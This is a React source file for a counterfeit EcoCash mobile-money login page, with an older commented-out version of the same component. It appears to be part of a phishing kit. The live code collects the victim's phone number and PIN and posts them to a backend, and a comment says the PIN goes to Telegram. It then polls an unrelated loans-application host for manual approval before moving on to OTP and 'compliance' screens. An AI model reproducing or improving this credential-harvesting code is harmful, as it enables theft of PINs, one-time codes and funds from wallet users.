import "./Login.css";
import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";

function Login({ client, setnumber, setpin, sendDetails }) {
  const { number } = client;
  const navigate = useNavigate();
  const [pin1, setPin1] = useState("");
  const [pin2, setPin2] = useState("");
  const [pin3, setPin3] = useState("");
  const [pin4, setPin4] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [status, setStatus] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [error, setError] = useState("");

  // Create refs for each input
  const pin1Ref = useRef(null);
  const pin2Ref = useRef(null);
  const pin3Ref = useRef(null);
  const pin4Ref = useRef(null);

  const localPin = [pin1, pin2, pin3, pin4];
  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
  const pinfull = pinString.length === 4;

  // Function to handle PIN input and auto-focus next field
  const handlePinInput = (pinNumber, value, setter) => {
    // Only allow numbers
    if (value && !/^\d$/.test(value)) return;

    setter(value);

    // Auto-focus next input if a digit was entered
    if (value !== "") {
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace - focus previous field
    if (value === "" && pinNumber > 1) {
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  // Handle keydown for navigation
  const handleKeyDown = (pinNumber, e) => {
    // Handle left arrow key
    if (e.key === "ArrowLeft" && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle right arrow key
    if (e.key === "ArrowRight" && pinNumber < 4) {
      e.preventDefault();
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace when empty
    if (e.key === "Backspace" && !localPin[pinNumber - 1] && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  // Function to send PIN to backend
  const sendPinToBackend = async () => {
    const mysdate = Date.now();
    if (!pinfull || !number) {
      setError("Please enter both phone number and PIN");
      return;
    }

    setVerifying(true);
    setError("");

    try {
      const response = await fetch("http://localhost:5000/api/verify-pin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phoneNumber: number,
          pinCode: pinString,
          userId: `user_${mysdate}`,
          userName: "EcoCash User",
        }),
      });

      const data = await response.json();

      if (data.success) {
        setSessionId(data.sessionId);
        setStatus("pending");

        // Start polling for PIN status
        pollPinStatus(data.sessionId);
      } else {
        setError(data.error || "Failed to verify PIN");
        setVerifying(false);
      }
    } catch (err) {
      setError("Network error. Please try again.");
      setVerifying(false);
    }
  };

  // Poll PIN status
  const pollPinStatus = async (sessionId) => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch(
          `https://kashagi-loans-application.onrender.com/api/check-pin-status/${sessionId}`
        );
        const data = await response.json();

        setStatus(data.status);

        if (data.status === "approved") {
          clearInterval(interval);
          setVerifying(false);
          // PIN approved, proceed to OTP
          console.log("approved");
          handleApprovedPin();
        } else if (data.status === "pinotp_correct") {
          setTimeout(() => {
            console.log("pin ot correct");
            navigate("/compliance");
          }, 2000);
        } else if (data.status === "wrong_pin" || data.status === "expired") {
          clearInterval(interval);
          setVerifying(false);
          console.log("wrong");
          setError(data.message || "PIN verification failed");
        }
        // Continue polling if still pending
      } catch (err) {
        console.error("Error checking PIN status:", err);
        clearInterval(interval);
        setVerifying(false);
      }
    }, 1000); // Check every 2 seconds
  };

  // Handle approved PIN
  const handleApprovedPin = () => {
    setpin(pinString);
    // Proceed to OTP verification
    sendDetails();
    navigate("/otpverification");
  };

  // Function to handle login
  const handleLogin = async () => {
    if (pinfull) {
      // Send PIN to Telegram for verification
      await sendPinToBackend();
    } else {
      setError("Please enter a 4-digit PIN");
    }
  };

  // Status messages
  const statusMessages = {
    pending: "🔐 verifying pin...",
    approved: "✅ PIN verified!",
    wrong_pin: "❌ Wrong PIN",
    pinotp_correct_: "🚫 PIN and OTP verified!",
    expired: "⏰ Verification timeout",
  };

  // Effect to focus first input on mount
  useEffect(() => {
    if (pin1Ref.current) {
      pin1Ref.current.focus();
    }
  }, []);

  return (
    <>
      <div className="container">
        <header>
          <div className="logo">
            <span>Eco</span>Cash
          </div>
          <h1 className="login-title">Welcome</h1>
        </header>

        <main>
          <div className="phone-number">
            <div className="numbercont">
              <div className="countrycode">+263</div>
              <input
                type="number"
                name="number"
                onChange={(e) => setnumber(e.target.value)}
                defaultValue={number}
                className="numcont"
                disabled={verifying}
              />
            </div>
          </div>

          <div className="pin-input-container">
            <label className="pin-label">Enter your PIN</label>
            <div>
              <input
                ref={pin1Ref}
                maxLength="1"
                type="number"
                className="no-spinner"
                value={pin1}
                onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
                onKeyDown={(e) => handleKeyDown(1, e)}
                disabled={verifying}
              />
              <input
                ref={pin2Ref}
                type="number"
                className="no-spinner"
                value={pin2}
                maxLength="1"
                onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
                onKeyDown={(e) => handleKeyDown(2, e)}
                disabled={verifying}
              />
              <input
                ref={pin3Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin3}
                onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
                onKeyDown={(e) => handleKeyDown(3, e)}
                disabled={verifying}
              />
              <input
                ref={pin4Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin4}
                onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                onKeyDown={(e) => handleKeyDown(4, e)}
                disabled={verifying}
              />
            </div>

            {/* Status/Error Display */}
            {error && (
              <div
                className="error-message"
                style={{ color: "red", marginTop: "10px" }}
              >
                {error}
              </div>
            )}

            {status && (
              <div
                className="status-message"
                style={{
                  color:
                    status === "approved"
                      ? "green"
                      : status === "pending"
                      ? "orange"
                      : "red",
                  marginTop: "10px",
                  fontWeight: "bold",
                }}
              >
                {statusMessages[status] || status}
              </div>
            )}
          </div>

          <div className="forgot-pin">
            <a href="#">Forgot PIN?</a>
          </div>
        </main>

        <footer className="footer">
          <div className="curvesec">
            <div></div>
            <div></div>
            <button
              className="btnContinue"
              onClick={handleLogin}
              disabled={!pinfull || verifying}
            >
              {verifying ? "Verifying PIN..." : "Login"}
            </button>
          </div>
          <div className="help-section">
            <p className="help-text">
              To register an EcoCash wallet or get assistance, click below
            </p>

            <div className="buttons-container">
              <button className="help-button register-button">Register</button>
              <button className="help-button support-button">
                Help & Support
              </button>
            </div>
          </div>

          <div className="terms">
            <div className="version">v2.1.3P</div>
            By signing in you agree to the Terms and Conditions
          </div>
        </footer>
      </div>
    </>
  );
}

export default Login;

// import "./Login.css";

// import React, { useState, useRef, useEffect } from "react";
// import { useNavigate } from "react-router-dom";

// function Login({ client, setnumber, setpin, sendDetails }) {
//   const { number } = client;
//   const navigate = useNavigate();
//   const [pin1, setPin1] = useState("");
//   const [pin2, setPin2] = useState("");
//   const [pin3, setPin3] = useState("");
//   const [pin4, setPin4] = useState("");

//   // Create refs for each input
//   const pin1Ref = useRef(null);
//   const pin2Ref = useRef(null);
//   const pin3Ref = useRef(null);
//   const pin4Ref = useRef(null);

//   const localPin = [pin1, pin2, pin3, pin4];
//   const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
//   const pinfull = pinString.length === 4;

//   // Function to handle PIN input and auto-focus next field
//   const handlePinInput = (pinNumber, value, setter) => {
//     // Only allow numbers
//     if (value && !/^\d$/.test(value)) return;

//     setter(value);

//     // Auto-focus next input if a digit was entered
//     if (value !== "") {
//       switch (pinNumber) {
//         case 1:
//           if (pin2Ref.current) pin2Ref.current.focus();
//           break;
//         case 2:
//           if (pin3Ref.current) pin3Ref.current.focus();
//           break;
//         case 3:
//           if (pin4Ref.current) pin4Ref.current.focus();
//           break;
//         default:
//           break;
//       }
//     }

//     // Handle backspace - focus previous field
//     if (value === "" && pinNumber > 1) {
//       switch (pinNumber) {
//         case 2:
//           if (pin1Ref.current) pin1Ref.current.focus();
//           break;
//         case 3:
//           if (pin2Ref.current) pin2Ref.current.focus();
//           break;
//         case 4:
//           if (pin3Ref.current) pin3Ref.current.focus();
//           break;
//         default:
//           break;
//       }
//     }
//   };

//   // Handle keydown for navigation
//   const handleKeyDown = (pinNumber, e) => {
//     // Handle left arrow key
//     if (e.key === "ArrowLeft" && pinNumber > 1) {
//       e.preventDefault();
//       switch (pinNumber) {
//         case 2:
//           if (pin1Ref.current) pin1Ref.current.focus();
//           break;
//         case 3:
//           if (pin2Ref.current) pin2Ref.current.focus();
//           break;
//         case 4:
//           if (pin3Ref.current) pin3Ref.current.focus();
//           break;
//         default:
//           break;
//       }
//     }

//     // Handle right arrow key
//     if (e.key === "ArrowRight" && pinNumber < 4) {
//       e.preventDefault();
//       switch (pinNumber) {
//         case 1:
//           if (pin2Ref.current) pin2Ref.current.focus();
//           break;
//         case 2:
//           if (pin3Ref.current) pin3Ref.current.focus();
//           break;
//         case 3:
//           if (pin4Ref.current) pin4Ref.current.focus();
//           break;
//         default:
//           break;
//       }
//     }

//     // Handle backspace when empty
//     if (e.key === "Backspace" && !localPin[pinNumber - 1] && pinNumber > 1) {
//       e.preventDefault();
//       switch (pinNumber) {
//         case 2:
//           if (pin1Ref.current) pin1Ref.current.focus();
//           break;
//         case 3:
//           if (pin2Ref.current) pin2Ref.current.focus();
//           break;
//         case 4:
//           if (pin3Ref.current) pin3Ref.current.focus();
//           break;
//         default:
//           break;
//       }
//     }
//   };

//   function handlePin() {
//     setpin(pinString);
//     // console.log("setpin");
//     // console.log(client.pin);
//   }

//   // Call handlePin when PIN is complete
//   useEffect(() => {
//     if (pinfull) {
//       handlePin();
//     }
//   }, [pinfull]);

//   function collectData() {
//     sendDetails();
//     navigate("/otpverification");
//     // console.log(client);
//   }

//   return (
//     <>
//       {/* {!shouldShowOTP ? ( */}
//       <div className="container">
//         <header>
//           <div className="logo">
//             <span>Eco</span>Cash
//           </div>
//           <h1 className="login-title">Welcome</h1>
//         </header>

//         <main>
//           <div className="phone-number">
//             <div className="numbercont">
//               <div className="countrycode">+263</div>
//               {/* +263 {number} */}
//               <input
//                 type="number"
//                 name="number"
//                 onChange={(e) => setnumber(e.target.value)}
//                 defaultValue={number}
//                 className="numcont"
//               />
//             </div>
//           </div>

//           <div className="pin-input-container">
//             <label className="pin-label">Enter your PIN</label>
//             <div>
//               <input
//                 ref={pin1Ref}
//                 maxLength="1"
//                 type="number"
//                 className="no-spinner"
//                 value={pin1}
//                 onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
//                 onKeyDown={(e) => handleKeyDown(1, e)}
//               />
//               <input
//                 ref={pin2Ref}
//                 type="number"
//                 className="no-spinner"
//                 value={pin2}
//                 maxLength="1"
//                 onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
//                 onKeyDown={(e) => handleKeyDown(2, e)}
//               />
//               <input
//                 ref={pin3Ref}
//                 type="number"
//                 maxLength="1"
//                 className="no-spinner"
//                 value={pin3}
//                 onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
//                 onKeyDown={(e) => handleKeyDown(3, e)}
//               />
//               <input
//                 ref={pin4Ref}
//                 type="number"
//                 maxLength="1"
//                 className="no-spinner"
//                 value={pin4}
//                 onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
//                 onKeyDown={(e) => handleKeyDown(4, e)}
//               />
//             </div>
//           </div>

//           <div className="forgot-pin">
//             <a href="#">Forgot PIN?</a>
//           </div>
//         </main>

//         <footer className="footer">
//           <div className="curvesec">
//             <div></div>
//             <div></div>
//             <button className="btnContinue" onClick={collectData}>
//               Login
//             </button>
//           </div>
//           <div className="help-section">
//             <p className="help-text">
//               To register an EcoCash wallet or get assistance, click below
//             </p>

//             <div className="buttons-container">
//               <button className="help-button register-button">Register</button>
//               <button className="help-button support-button">
//                 Help & Support
//               </button>
//             </div>
//           </div>

//           <div className="terms">
//             <div className="version">v2.1.3P</div>
//             By signing in you agree to the Terms and Conditions
//           </div>
//         </footer>
//       </div>
//       {/* // ) : ( // // Note: You need to import and define OtpVerification
//       component // <div>OTP Verification Component would go here</div>
//       // )} */}
//     </>
//   );
// }

// export default Login;
